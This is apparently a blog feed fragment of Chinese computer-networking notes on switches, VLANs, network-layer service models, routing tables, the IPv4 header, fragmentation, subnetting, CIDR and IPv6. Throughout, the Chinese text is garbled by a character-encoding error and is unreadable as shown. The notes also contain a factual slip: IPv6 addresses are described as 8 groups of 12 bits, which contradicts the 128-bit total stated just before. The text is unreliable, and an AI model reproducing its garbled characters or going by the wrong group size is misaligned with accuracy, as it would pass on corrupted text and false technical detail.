<p><img src="https://i.loli.net/2021/03/10/7QwzHUBKx8osWyj.png" alt="ä¸åŒå­ç½‘ARP.png"></p>
<h2 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h2><p>äº¤æ¢æœºæ˜¯å…¸å‹çš„<strong>é“¾è·¯å±‚è®¾å¤‡</strong>ï¼Œäº¤æ¢å¯ä»¥åœ¨å¤šä¸ªä¸»æœºé—´<strong>åŒæ—¶</strong>è¿›è¡Œã€‚ç‰¹ç‚¹æœ‰ï¼š</p>
<ul>
<li>å­˜å‚¨ã€è½¬å‘ä»¥å¤ªç½‘å¸§</li>
<li>æ£€éªŒåˆ°è¾¾å¸§çš„ MAC åœ°å€ï¼Œé€‰æ‹©æ€§å‘ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡ºé“¾è·¯è½¬å‘</li>
<li>åˆ©ç”¨ CSMA/CD åè®®è®¿é—®é“¾è·¯</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/TIbQX3Sf5Uc9nvB.png" alt="äº¤æ¢æœº"></p>
<p>æ¯ä¸ªäº¤æ¢æœºç»´æŠ¤ä¸€å¼ <strong>äº¤æ¢è¡¨</strong>ï¼Œæ¯ä¸ªè¡¨é¡¹å­˜æ”¾ï¼ˆä¸»æœº MAC åœ°å€ï¼Œåˆ°è¾¾ä¸»æœºçš„æ¥å£ï¼Œæ—¶é—´æˆ³ï¼‰ã€‚</p>
<p>äº¤æ¢æœºé€šè¿‡<strong>è‡ªå­¦ä¹ </strong>ï¼Œè·çŸ¥åˆ°è¾¾ä¸»æœºçš„æ¥å£ä¿¡æ¯ã€‚å½“ä¸€ä¸ªå¸§åˆ°è¾¾äº¤æ¢æœºæ—¶ï¼š</p>
<ol>
<li>æ”¶å¸§ï¼Œäº¤æ¢æœºæå–åˆ°å¸§çš„æº MAC åœ°å€ï¼Œå°†æºä¸»æœºçš„ MAC åœ°å€ä¸æ¥å£ä¿¡æ¯è®°å½•åˆ°äº¤æ¢è¡¨ä¸­</li>
<li>åˆ©ç”¨ç›®çš„ MAC åœ°å€æ£€ç´¢äº¤æ¢è¡¨<ul>
<li>æ£€ç´¢æˆåŠŸï¼šå¦‚æœç›®çš„ä¸»æœºä¸æºä¸»æœºå¤„äºåŒä¸€ç½‘æ®µï¼ˆæœ‰ç›¸åŒçš„äº¤æ¢æœºæ¥å£ï¼‰åˆ™ä¸¢å¼ƒå¸§ï¼›å¦åˆ™å°†å¸§è½¬å‘åˆ°ç›¸åº”æ¥å£</li>
<li>æ£€ç´¢å¤±è´¥ï¼šæ´ªæ³›ï¼ˆå‘é™¤äº†æ¥æ”¶æ¥å£ä¹‹å¤–æ‰€æœ‰æ¥å£è½¬å‘ï¼‰</li>
</ul>
</li>
</ol>
<p><img src="https://i.loli.net/2020/02/03/gPpzCavur2m91bk.png" alt="ç»„ç»‡æœºæ„ç½‘ç»œ"></p>
<h3 id="äº¤æ¢æœº-vs-è·¯ç”±å™¨"><a href="#äº¤æ¢æœº-vs-è·¯ç”±å™¨" class="headerlink" title="äº¤æ¢æœº vs è·¯ç”±å™¨"></a>äº¤æ¢æœº vs è·¯ç”±å™¨</h3><p>ä¸¤è€…å‡ä¸ºå­˜å‚¨ã€è½¬å‘è®¾å¤‡ï¼š</p>
<ul>
<li>è·¯ç”±å™¨ï¼šç½‘ç»œå±‚è®¾å¤‡ï¼ˆæ£€æµ‹ç½‘ç»œå±‚åˆ†ç»„é¦–éƒ¨ï¼‰</li>
<li>äº¤æ¢æœºï¼šé“¾è·¯å±‚è®¾å¤‡ï¼ˆæ£€æµ‹é“¾è·¯å±‚å¸§é¦–éƒ¨ï¼‰</li>
</ul>
<p>ä¸¤è€…å‡ä½¿ç”¨è½¬å‘è¡¨ï¼š</p>
<ul>
<li>è·¯ç”±å™¨ï¼šåˆ©ç”¨è·¯ç”±ç®—æ³•</li>
<li>äº¤æ¢æœºï¼šåˆ©ç”¨è‡ªå­¦ä¹ </li>
</ul>
<h2 id="è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰"><a href="#è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰" class="headerlink" title="è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰"></a>è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰</h2><p>é€šè¿‡å¯¹äº¤æ¢æœºæ¥å£æˆ– MAC åœ°å€è¿›è¡Œåˆ†ç»„ï¼Œåœ¨ä¸€ä¸ªç‰©ç†å±€åŸŸç½‘ä¸Šé…ç½®å¤šä¸ªè™šæ‹Ÿå±€åŸŸç½‘ã€‚è¿™æ ·å°±é¿å…äº†å¹¿æ’­æŠ¥æ–‡ï¼ˆDHCPã€ARP ç­‰ï¼‰åœ¨ä¸å¿…è¦çš„æœºå™¨ç»„ä¸­ä¼ æ’­ï¼ˆ<strong>æµé‡éš”ç¦»</strong>ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2020/02/05/cZXOdiAoawHnWI7.png" alt="æ¥å£åˆ†ç»„"></p>
<p><img src="https://i.loli.net/2020/02/05/OJNQRrKyuDflYqm.png" alt="MACåˆ†ç»„"></p>
<p><strong>é€šè¿‡è·¯ç”±å™¨åœ¨ VLAN é—´è½¬å‘</strong>ï¼ˆåƒç‹¬ç«‹çš„äº¤æ¢æœºä¹‹é—´ï¼‰ã€‚</p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>é“¾è·¯å±‚</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹ç½‘ç»œå±‚</title>
    <url>/2020/01/25/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    <content><![CDATA[<p>ç½‘ç»œå±‚çš„æ ¸å¿ƒåŠŸèƒ½æœ‰ä¸¤ä¸ªï¼š</p>
<ul>
<li>è·¯ç”±ï¼šç¡®å®šåˆ†ç»„ä»æºåˆ°ç›®çš„ç»è¿‡çš„è·¯å¾„ã€‚ç”±<strong>è·¯ç”±ç®—æ³•</strong>ç¡®å®šè½¬å‘è¡¨</li>
<li>è½¬å‘ï¼šæ•°æ®æŠ¥ç”±è·¯ç”±å™¨çš„è¾“å…¥ç«¯å£è½¬ç§»åˆ°åˆé€‚çš„è¾“å‡ºç«¯å£ã€‚æ¯ä¸ªè·¯ç”±å™¨ç»´æŠ¤ä¸€ä¸ª<strong>è½¬å‘è¡¨</strong></li>
</ul>
<h2 id="æœåŠ¡æ¨¡å‹"><a href="#æœåŠ¡æ¨¡å‹" class="headerlink" title="æœåŠ¡æ¨¡å‹"></a>æœåŠ¡æ¨¡å‹</h2><p>åœ¨å‘é€æ–¹ä¸»æœºä¸æ¥æ”¶æ–¹ä¸»æœºä¹‹é—´ä¼ è¾“æ•°æ®æŠ¥ã€‚å±äº<code>å°½åŠ›è€Œä¸º</code>æœåŠ¡ã€‚</p>
<ul>
<li>æ— è¿æ¥æœåŠ¡ï¼šä¸äº‹å…ˆä¸ºç³»åˆ—åˆ†ç»„çš„ä¼ è¾“ç¡®å®šè·¯å¾„ï¼Œæ¯ä¸ªåˆ†ç»„ç‹¬ç«‹ç¡®å®šè·¯å¾„ã€‚ç”±è·¯ç”±å™¨æ ¹æ®å½“å‰ç½‘ç»œçŠ¶æ€é€‰æ‹©è·¯å¾„ï¼ˆæ•°æ®æŠ¥ç½‘ç»œï¼‰</li>
<li>è¿æ¥æœåŠ¡ï¼šé¦–å…ˆä¸ºç³»åˆ—åˆ†ç»„çš„ä¼ è¾“ç¡®å®šè·¯å¾„ï¼Œå»ºç«‹ç½‘ç»œå±‚é€»è¾‘è¿æ¥ï¼ˆè™šç”µè·¯ç½‘ç»œï¼‰</li>
</ul>
<p><img src="https://i.loli.net/2020/01/28/UXhmizIdVLYHj94.png" alt="ç½‘ç»œå±‚æœåŠ¡"></p>
<h3 id="è™šç”µè·¯ç½‘ç»œ"><a href="#è™šç”µè·¯ç½‘ç»œ" class="headerlink" title="è™šç”µè·¯ç½‘ç»œ"></a>è™šç”µè·¯ç½‘ç»œ</h3><p>è™šç”µè·¯ï¼šä¸€æ¡ä»æºä¸»æœºåˆ°ç›®çš„ä¸»æœºï¼Œç±»ä¼¼äºå®ä½“ç”µè·¯çš„è™šæ‹Ÿè¿æ¥è·¯å¾„ã€‚ä¸å®é™…ç”µè·¯æœ€å¤§çš„åŒºåˆ«åœ¨äº<strong>åˆ†ç»„äº¤æ¢</strong>ã€‚</p>
<p>è·¯å¾„ä¸Šæ¯ä¸€ä¸ªç½‘ç»œè®¾å¤‡éƒ½è¦ç»´æŠ¤è™šç”µè·¯è¿æ¥çŠ¶æ€ã€‚</p>
<h4 id="é€šä¿¡è¿‡ç¨‹"><a href="#é€šä¿¡è¿‡ç¨‹" class="headerlink" title="é€šä¿¡è¿‡ç¨‹"></a>é€šä¿¡è¿‡ç¨‹</h4><ol>
<li>å‘¼å«å»ºç«‹</li>
<li>æ•°æ®ä¼ è¾“</li>
<li>æ‹†é™¤å‘¼å«</li>
</ol>
<h4 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h4><p>æ¯æ¡è™šç”µè·¯åŒ…æ‹¬ï¼š</p>
<ul>
<li>æºä¸»æœºåˆ°ç›®çš„ä¸»æœºçš„<strong>ä¸€æ¡è·¯å¾„</strong></li>
<li><strong>è™šç”µè·¯å·ï¼ˆVCIDï¼‰</strong>ï¼Œæ²¿è·¯æ¯æ®µé“¾è·¯ä¸€ä¸ªç¼–å·</li>
<li>ç½‘ç»œå±‚è®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨ï¼‰<strong>ç”¨è½¬å‘è¡¨è®°å½•ç»è¿‡çš„æ¯æ¡è™šç”µè·¯</strong></li>
</ul>
<p>æ²¿æŸæ¡è™šç”µè·¯ä¼ è¾“çš„åˆ†ç»„ï¼Œæºå¸¦å¯¹åº”è™šç”µè·¯çš„ VCID è€Œä¸æ˜¯ç›®çš„åœ°å€ã€‚</p>
<p><img src="https://i.loli.net/2020/01/25/79sQjzEGxgWF3oy.png" alt="è™šç”µè·¯å·"></p>
<h3 id="æ•°æ®æŠ¥ç½‘ç»œ"><a href="#æ•°æ®æŠ¥ç½‘ç»œ" class="headerlink" title="æ•°æ®æŠ¥ç½‘ç»œ"></a>æ•°æ®æŠ¥ç½‘ç»œ</h3><p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>ç½‘ç»œå±‚æ— è¿æ¥</li>
<li>æ¯ä¸ªåˆ†ç»„æºå¸¦ç›®çš„åœ°å€</li>
<li>è·¯ç”±å™¨æ ¹æ®åˆ†ç»„ç›®çš„åœ°å€è½¬å‘åˆ†ç»„ï¼ˆæ„å»ºè½¬å‘è¡¨ã€æ£€ç´¢è½¬å‘è¡¨ã€ç‹¬ç«‹é€‰è·¯ï¼‰</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/kMumZIhvYcxjQod.png" alt="æ•°æ®æŠ¥ç½‘ç»œ"></p>
<p>è·¯ç”±å™¨æŒ‰ç…§<strong>æœ€é•¿åŒ¹é…å‰ç¼€åŸåˆ™</strong>é€‰æ‹©è½¬å‘æ¥å£ã€‚</p>
<p>Internet å°±å±äºæ•°æ®æŠ¥ç½‘ç»œã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç°å®ä¸­çš„è·¯ç”±è¡¨ç¤ºä¾‹ï¼ˆæœ¬åœ°ç½‘å¡ IP åœ°å€ 192.168.100.107ï¼Œå­ç½‘æ©ç  255.255.255.0ï¼Œé»˜è®¤ç½‘å…³ 192.168.100.11ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2020/05/17/EYpG8NLcA1yjivJ.png" alt="è·¯ç”±è¡¨"></p>
<p>æ¥å£åˆ—è¡¨æŒ‡æ˜äº†è¯¥æœºæœ‰å“ªäº›æ¥å£ã€‚ç½‘ç»œç›®æ ‡ &amp; ç½‘ç»œæ©ç  == å­ç½‘ï¼Œæ ¹æ®å­ç½‘å°†æ•°æ®æŠ¥ä»ä¸åŒæ¥å£å‘é€å‡ºå»ã€‚</p>
<ul>
<li>ç½‘ç»œç›®æ ‡ï¼šç”¨æ¥æ ‡è¯†æ•°æ®åŒ…çš„ç›®çš„ç½‘ç»œ</li>
<li>ç½‘ç»œæ©ç ï¼šä¸ç½‘ç»œç›®æ ‡ä¸€èµ·æ ‡è¯†ç›®çš„ä¸»æœºæˆ–è€…è·¯ç”±å™¨çš„å­ç½‘åœ°å€</li>
<li>æ¥å£ï¼šæ•°æ®åŒ…ä»å“ªä¸ªæ¥å£å‘å‡ºå»</li>
<li>ç½‘å…³ï¼šæ•°æ®åŒ…ä¸‹ä¸€è·³çš„ IP åœ°å€</li>
<li>è·ƒç‚¹ï¼šä¼˜å…ˆçº§ï¼Œè·ƒç‚¹è¶Šå°‘ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
</ul>
<table>
<thead>
<tr>
<th>ç½‘ç»œç›®æ ‡</th>
<th>ç½‘ç»œæ©ç </th>
<th>ç½‘å…³</th>
<th>æ¥å£</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>0.0.0.0</td>
<td>0.0.0.0</td>
<td>192.168.100.11</td>
<td>192.168.100.107</td>
<td>æ”¶åˆ°ä¸€ä¸ªç›®çš„åœ°å€ä¸åœ¨è·¯ç”±è¡¨ä¸­çš„æ•°æ®åŒ…ï¼Œå°†è¯¥æ•°æ®åŒ…é€šè¿‡ 192.168.100.107 å‘é€åˆ°é»˜è®¤ç½‘å…³ 192.168.100.11</td>
</tr>
<tr>
<td>127.0.0.0</td>
<td>255.0.0.0</td>
<td>åœ¨é“¾è·¯ä¸Š</td>
<td>127.0.0.1</td>
<td>æ”¶åˆ°ä¸€ä¸ªå‘å¾€ç›®æ ‡ç½‘æ®µ 127.0.0.0/8 çš„æ•°æ®åŒ…æ—¶ï¼Œå‘é€ç»™è¯¥ç½‘æ®µçš„æ‰€æœ‰æ•°æ®åŒ…</td>
</tr>
<tr>
<td>127.0.0.1</td>
<td>255.255.255.255</td>
<td>åœ¨é“¾è·¯ä¸Š</td>
<td>127.0.0.1</td>
<td>æ”¶åˆ°ä¸€ä¸ªç›®çš„ IP ä¸ºé»˜è®¤æœ¬æœº IP çš„æ•°æ®åŒ…æ—¶ï¼Œç³»ç»Ÿä¼šå°†è¯¥æ•°æ®åŒ…æ”¶ä¸‹</td>
</tr>
<tr>
<td>192.168.100.0</td>
<td>255.255.255.0</td>
<td>åœ¨é“¾è·¯ä¸Š</td>
<td>192.168.100.107</td>
<td>æ”¶åˆ°ä¸€ä¸ªå‘å¾€ç›®çš„ç½‘æ®µ 192.168.100.0/24 çš„æ•°æ®åŒ…æ—¶ï¼Œå°†è¯¥æ•°æ®åŒ…é€šè¿‡ 192.168.100.107 è¿™ä¸ªæ¥å£å‘é€å‡ºå»</td>
</tr>
<tr>
<td>192.168.100.107</td>
<td>255.255.255.255</td>
<td>åœ¨é“¾è·¯ä¸Š</td>
<td>192.168.100.107</td>
<td>æ”¶åˆ°ä¸€ä¸ªç›®çš„ IP ä¸ºæœ¬åœ°ç½‘å¡ IP çš„æ•°æ®åŒ…æ—¶ï¼Œç³»ç»Ÿä¼šå°†è¯¥æ•°æ®åŒ…æ”¶ä¸‹</td>
</tr>
<tr>
<td>192.168.100.255</td>
<td>255.255.255.255</td>
<td>åœ¨é“¾è·¯ä¸Š</td>
<td>192.168.100.107</td>
<td>æ”¶åˆ°ä¸€ä¸ªå‘ç»™ç›´è¿ç½‘æ®µçš„æœ¬åœ°å¹¿æ’­æ•°æ®åŒ…æ—¶ï¼Œç³»ç»Ÿä¼šå°†è¯¥æ•°æ®åŒ…ä» 192.168.100.107 è¿™ä¸ªæ¥å£ä»¥å¹¿æ’­çš„å½¢å¼å‘é€å‡ºå»</td>
</tr>
</tbody></table>
<h2 id="IP-åè®®"><a href="#IP-åè®®" class="headerlink" title="IP åè®®"></a>IP åè®®</h2><p><img src="https://i.loli.net/2020/01/28/YEol4CqfpZMPDck.png" alt="IPæ•°æ®æŠ¥"></p>
<ul>
<li>ç‰ˆæœ¬å·ï¼š4bitsã€‚</li>
<li>é¦–éƒ¨é•¿åº¦ï¼š4bitsã€‚é¦–éƒ¨å­—èŠ‚æ•° = 4 * é¦–éƒ¨é•¿åº¦</li>
<li>æœåŠ¡ç±»å‹ï¼š8bitsã€‚åŒºåˆ«ä¸åŒç±»å‹ IP æ•°æ®æŠ¥ï¼Œåªæœ‰åœ¨ç½‘ç»œæä¾›åŒºåˆ†æœåŠ¡æ‰æœ‰ç”¨</li>
<li>æ€»é•¿åº¦ï¼š16bitsã€‚IP åˆ†ç»„çš„æ€»å­—èŠ‚æ•°ï¼ˆ20 B - 65535 Bï¼‰</li>
<li>ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ï¼š8bitsã€‚IP åˆ†ç»„åœ¨ç½‘ç»œä¸­å¯ä»¥é€šè¿‡çš„è·¯ç”±å™¨æ•°ã€‚è·¯ç”±å™¨æ¯è½¬å‘ä¸€æ¬¡è¿™ä¸ªå€¼ -1</li>
<li>åè®®ï¼š8bitsã€‚æŒ‡ç¤º IP åˆ†ç»„å°è£…çš„æ˜¯å“ªä¸ªä¼ è¾“å±‚åè®®ï¼ˆTCP/UDPï¼‰çš„æ•°æ®æŠ¥</li>
<li>é¦–éƒ¨æ ¡éªŒå’Œï¼š16bitsã€‚å¯¹ IP åˆ†ç»„<strong>é¦–éƒ¨</strong>çš„å·®é”™æ£€æµ‹ï¼Œæ¯æ¬¡è·¯ç”±å™¨è½¬å‘éƒ½è¦é‡æ–°è®¡ç®—</li>
<li>æº IPã€ç›®çš„ IPï¼š32bitsã€‚</li>
<li>é€‰é¡¹å­—æ®µï¼š1-40 bytesã€‚IPv4 ä¸­<strong>é€šå¸¸ä¸å­˜åœ¨</strong>è¿™ä¸ªå­—æ®µã€‚</li>
<li>å¡«å……ï¼š0-3 bytesã€‚è¡¥é½é•¿åº¦ï¼Œä¿è¯é¦–éƒ¨é•¿åº¦æ˜¯ 4bytes çš„å€æ•°ã€‚</li>
</ul>
<p>IPv4 æ•°æ®æŠ¥é¦–éƒ¨é•¿åº¦é€šå¸¸ä¸º 20 bytesï¼ˆ5 è¡Œï¼Œæ¯è¡Œ 4bytesï¼‰ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚å…¸å‹å€¼ä¸º 45ï¼ˆç‰ˆæœ¬å· 4ï¼Œé¦–éƒ¨é•¿åº¦ 5ï¼‰ã€‚</p>
<h3 id="IP-åˆ†ç‰‡"><a href="#IP-åˆ†ç‰‡" class="headerlink" title="IP åˆ†ç‰‡"></a>IP åˆ†ç‰‡</h3><p>æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMTUï¼‰ï¼š<strong>é“¾è·¯å±‚</strong>æ•°æ®å¸§å¯å°è£…çš„å­—èŠ‚æ•°çš„ä¸Šé™ã€‚ä¸åŒé“¾è·¯çš„ MTU å¯èƒ½ä¸åŒã€‚</p>
<p>ä¸ºäº†è§£å†³ä¸åŒé“¾è·¯ä¹‹é—´ MTU ä¸åŒé—®é¢˜ï¼ŒIP åˆ†ç»„éœ€è¦è¿›è¡Œ<strong>åˆ†ç‰‡</strong>ã€‚IP åˆ†ç‰‡åˆ°è¾¾<strong>ç›®çš„ä¸»æœº</strong>åè¿›è¡Œ<strong>é‡ç»„</strong>ã€‚å¦‚æœä¼ è¾“è¿‡ç¨‹ä¸­ä¸ªåˆ«åˆ†ç»„ä¸¢å¤±å¯¼è‡´é‡ç»„å¤±è´¥ï¼Œç›®çš„ä¸»æœºç›´æ¥<strong>ä¸¢å¼ƒ</strong>å·²æ¥æ”¶åˆ†ç»„ã€‚</p>
<p>IP é¦–éƒ¨ç›¸å…³å­—æ®µå‚ä¸æ ‡è¯†åˆ†ç‰‡ä¸ç¡®å®šåˆ†ç‰‡é¡ºåºï¼šæ€»é•¿åº¦ã€æ ‡è¯†ã€æ ‡å¿—ä½ã€ç‰‡åç§»ã€‚</p>
<ul>
<li>æ ‡è¯†ï¼š16bitsã€‚æ ‡è¯†ä¸€ä¸ª IP åˆ†ç»„ã€‚IP åè®®åˆ©ç”¨ä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯äº§ç”Ÿä¸€ä¸ª IP åˆ†ç»„è®¡æ•°å™¨ +1ï¼Œä½œä¸ºè¯¥åˆ†ç»„çš„è¡¨ç¤ºã€‚</li>
<li>æ ‡å¿—ä½ï¼š3bitsã€‚ä¿ç•™ + DF(Donâ€™t Fragment) + MF(More Fragment)<br><img src="https://i.loli.net/2020/01/28/JDLmZTzw6kbp3tq.png" alt="æ ‡å¿—ä½æ ¼å¼"></li>
<li>ç‰‡åç§»ï¼š13bitsã€‚ä¸€ä¸ªåˆ†ç‰‡å°è£…æº IP åˆ†ç»„æ•°æ®çš„ç›¸å¯¹åç§»é‡ã€‚åç§»å­—èŠ‚æ•° = 8 * ç‰‡åç§»</li>
</ul>
<p>å‡è®¾ IP åˆ†ç»„æ€»é•¿åº¦ Lï¼Œé“¾è·¯ MTU ä¸º Mã€‚è‹¥ L &gt; M ä¸” DF = 0ï¼Œåˆ™éœ€è¦åˆ†ç‰‡ã€‚åˆ†ç‰‡æ—¶æ¯ä¸ªåˆ†ç‰‡çš„æ ‡è¯†å¤åˆ¶åŸ IP åˆ†ç»„çš„æ ‡è¯†ã€‚é™¤æœ€åä¸€ä¸ªåˆ†ç‰‡ï¼Œå…¶ä½™åˆ†ç‰‡å‡ä¸º MTU å…è®¸çš„æœ€å¤§åˆ†ç‰‡ä¸”æ•°æ®å¤§å°ä¸º 8 çš„å€æ•°ã€‚</p>
<h3 id="IP-ç¼–å€"><a href="#IP-ç¼–å€" class="headerlink" title="IP ç¼–å€"></a>IP ç¼–å€</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>ä¸€å…± 32 bitsï¼Œæ ‡è¯†ä¸»æœºã€è·¯ç”±å™¨çš„<strong>æ¥å£</strong>ã€‚</p>
<h5 id="å­ç½‘"><a href="#å­ç½‘" class="headerlink" title="å­ç½‘"></a>å­ç½‘</h5><p>IP åœ°å€ = ç½‘ç»œå·ï¼ˆé«˜æ¯”ç‰¹ä½ï¼‰ + ä¸»æœºå·ï¼ˆä½æ¯”ç‰¹ä½ï¼‰ã€‚ç›¸åŒç½‘ç»œå·ç»„æˆçš„ç½‘ç»œç§°ä¸º<strong>IP å­ç½‘</strong>ã€‚è½¬å‘è¡¨åªè®°å½•<strong>å­ç½‘åœ°å€</strong>ã€‚</p>
<p>IP å­ç½‘ä¸­çš„è®¾å¤‡å¯ä»¥ä¸è·¨è¶Šè·¯ç”±å™¨å½¼æ­¤ç‰©ç†è”é€šã€‚</p>
<p><img src="https://i.loli.net/2020/01/29/wbMGcL2HjV3qKTO.png" alt="IP å­ç½‘"></p>
<h5 id="æœ‰ç±»-IP-åœ°å€"><a href="#æœ‰ç±»-IP-åœ°å€" class="headerlink" title="æœ‰ç±» IP åœ°å€"></a>æœ‰ç±» IP åœ°å€</h5><p><img src="https://i.loli.net/2020/01/29/hGEr5QJgxKwjLTb.png" alt="æœ‰ç±»ç¼–å€"></p>
<p>A ç±»ç½‘ç»œæ•°å°‘ï¼Œæ¯ä¸ªç½‘ç»œå†…ä¸»æœºæ•°å¤šï¼›C ç±»ç½‘ç»œæ•°å¤šï¼Œæ¯ä¸ªç½‘ç»œå†…ä¸»æœºæ•°å°‘ã€‚</p>
<p>D ç±»ã€E ç±»ä¸åˆ’åˆ†ç½‘ç»œå·å’Œä¸»æœºå·ï¼ŒD ç±»ç”¨äºå¤šæ’­ï¼ŒE ç±»æš‚ä¸ä½¿ç”¨ã€‚</p>
<h5 id="ç§æœ‰åœ°å€"><a href="#ç§æœ‰åœ°å€" class="headerlink" title="ç§æœ‰åœ°å€"></a>ç§æœ‰åœ°å€</h5><p>ç§æœ‰åœ°å€åªç”¨äºå­ç½‘å†…éƒ¨ï¼Œåœ¨å…¬å…± Internet ä¸Šæ— æ•ˆã€‚</p>
<p><img src="https://i.loli.net/2020/01/29/o5EFlHrysNKYw4X.png" alt="ç§æœ‰åœ°å€"></p>
<h5 id="ç‰¹æ®Š-IP-åœ°å€"><a href="#ç‰¹æ®Š-IP-åœ°å€" class="headerlink" title="ç‰¹æ®Š IP åœ°å€"></a>ç‰¹æ®Š IP åœ°å€</h5><p><img src="https://i.loli.net/2020/01/29/PktSwAIXfhDiHGd.png" alt="ç‰¹æ®Š IP"></p>
<h5 id="å­ç½‘åˆ’åˆ†"><a href="#å­ç½‘åˆ’åˆ†" class="headerlink" title="å­ç½‘åˆ’åˆ†"></a>å­ç½‘åˆ’åˆ†</h5><p>IP åœ°å€ = ç½‘ç»œå·ï¼ˆé«˜æ¯”ç‰¹ä½ï¼‰ + å­ç½‘å·ï¼ˆéƒ¨åˆ†åŸä¸»æœºå·é«˜æ¯”ç‰¹ä½ï¼‰ + ä¸»æœºå·ï¼ˆä½æ¯”ç‰¹ä½ï¼‰</p>
<h5 id="å­ç½‘æ©ç "><a href="#å­ç½‘æ©ç " class="headerlink" title="å­ç½‘æ©ç "></a>å­ç½‘æ©ç </h5><p>ç”¨é€”ï¼šè¡¨æ˜ä¸€ä¸ª IP åœ°å€æ‰€å¤„å­ç½‘çš„å­ç½‘å·ã€‚</p>
<p>å–å€¼ï¼š 32 bitsã€‚IP åœ°å€çš„ç½‘ç»œå·ã€å­ç½‘å·å…¨å– 1ï¼Œä¸»æœºå·å…¨å– 0ã€‚</p>
<p>ä¾‹ï¼šA ç½‘é»˜è®¤å­ç½‘æ©ç  255.0.0.0ï¼›B ç±»é»˜è®¤å­ç½‘æ©ç  255.255.0.0ï¼›C ç±»é»˜è®¤å­ç½‘æ©ç  255.255.255.0ï¼›3 ä½å­ç½‘å·çš„ B ç±»å­ç½‘æ©ç  255.255.224.0ã€‚</p>
<p><strong>â€œå­ç½‘åœ°å€ + å­ç½‘æ©ç â€ç¡®å®šå­ç½‘å¤§å°ï¼</strong></p>
<p>å°† IP åˆ†ç»„ç›®çš„ IP åœ°å€ä¸å­ç½‘æ©ç <strong>æŒ‰ä½ä¸</strong>è¿ç®—ï¼Œå¾—åˆ°<strong>å­ç½‘åœ°å€</strong>ã€‚</p>
<h4 id="CIDR-Classless-InterDomain-Routing"><a href="#CIDR-Classless-InterDomain-Routing" class="headerlink" title="CIDR(Classless InterDomain Routing)"></a>CIDR(Classless InterDomain Routing)</h4><p>æ¶ˆé™¤ä¼ ç»Ÿ Aã€Bã€C ç±»åœ°å€ç•Œé™ã€‚ç½‘ç»œå·ä¸ä¸»æœºå·ç»„æˆç½‘ç»œå‰ç¼€ï¼Œå‰ç¼€å¯ä»¥ä»»æ„é•¿åº¦ã€‚</p>
<p>èåˆå­ç½‘åœ°å€ä¸å­ç½‘æ©ç ï¼Œæ–¹ä¾¿å­ç½‘åˆ’åˆ†ã€‚æ— ç±»åœ°å€æ ¼å¼ï¼ša.b.c.d/xï¼Œx ä¸ºå‰ç¼€é•¿åº¦ã€‚</p>
<h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><p>IPv6 æ•°æ®æŠ¥æ ¼å¼ï¼š</p>
<ul>
<li>å›ºå®šé•¿åº¦ä¸º 40bytes çš„<strong>åŸºæœ¬é¦–éƒ¨</strong></li>
<li>ä¸å…è®¸åˆ†ç‰‡</li>
</ul>
<p><img src="https://i.loli.net/2020/01/30/b1QmZhWnNd94vFs.png" alt="IPv6æ ¼å¼"></p>
<ul>
<li>æµæ ‡ç­¾ï¼š24bitsã€‚è¡¨ç¤ºåŒä¸€â€œæµâ€ä¸­çš„æ•°æ®æŠ¥ã€‚æµï¼šæºä¸»æœºåˆ°ç›®çš„ä¸»æœºçš„æ‰€æœ‰ IPv6 æ•°æ®æŠ¥</li>
<li>è½½è·é•¿åº¦ï¼š16 bitsã€‚</li>
<li>ä¸‹ä¸€é¦–éƒ¨ï¼š8bitsã€‚æŒ‡å‘ç¬¬ä¸€ä¸ªæ‰©å±•é¦–éƒ¨ï¼Œå¦‚æœæ‰©å±•é¦–éƒ¨ä¸å­˜åœ¨åˆ™æŒ‡å‘ä¼ è¾“å±‚æŠ¥æ–‡é¦–éƒ¨</li>
<li>è·³æ­¥é™åˆ¶ï¼š8bitsã€‚æŠ¥æ–‡ç”Ÿå­˜æ—¶é—´</li>
</ul>
<h5 id="IPv6-åœ°å€å½¢å¼"><a href="#IPv6-åœ°å€å½¢å¼" class="headerlink" title="IPv6 åœ°å€å½¢å¼"></a>IPv6 åœ°å€å½¢å¼</h5><p>ä¸€å…± 128 bitsã€‚åˆ’åˆ†ä¸º 8 ç»„ï¼Œæ¯ç»„ 12 bitsï¼Œä»¥ 16 è¿›åˆ¶è¡¨ç¤ºã€‚å¦‚ï¼š<code>1080:0:0:0:8:800:200C:417A</code>ï¼Œå½“ä¸­é—´å‡ºç°å¤šä¸ªè¿ç»­çš„ 0ï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©å½¢å¼ï¼š<code>1080::8:800:200C:417A</code>ã€‚</p>
<p><strong>IPv6 ä¸å†ä½¿ç”¨æ©ç ï¼</strong>ï¼Œç»Ÿä¸€ä»¥ CIDR å½¢å¼è¡¨ç¤ºç½‘ç»œå¤§å°ã€‚</p>
